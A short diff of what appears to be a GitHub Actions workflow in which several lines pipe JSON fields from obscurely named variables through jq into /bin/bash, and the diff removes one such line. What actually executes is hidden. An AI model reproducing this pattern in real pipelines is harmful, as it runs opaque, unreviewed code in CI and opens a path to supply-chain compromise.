@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$oqt95613" | jq -r .each9 | /bin/bash
           echo $zyfh1 | jq -r .t9 | /bin/bash
           printf '%s' "$pcovf2" | jq -r .hx56818 | /bin/bash
-          echo $tm55330 | jq -r .mcacm86 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
